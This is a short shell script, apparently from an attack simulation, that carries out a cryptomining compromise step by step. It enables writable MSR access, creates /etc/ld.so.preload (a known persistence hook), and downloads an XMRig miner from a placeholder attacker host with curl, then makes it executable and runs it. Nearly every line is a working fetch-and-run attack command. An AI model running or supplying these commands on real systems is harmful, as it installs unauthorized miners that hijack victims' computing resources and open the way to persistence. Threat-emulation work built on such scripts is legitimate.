echo "--- Cryptomining ---"
echo "Optimizing host for mining"
/sbin/modprobe msr allow_writes=on > /dev/null 2>&1
touch /etc/ld.so.preload 
echo "Downloading and running Xmrig crypto miner"
curl -s "http://$NAME-attacker/xmrig" -o xmrig && chmod +x xmrig && ./xmrig
echo " "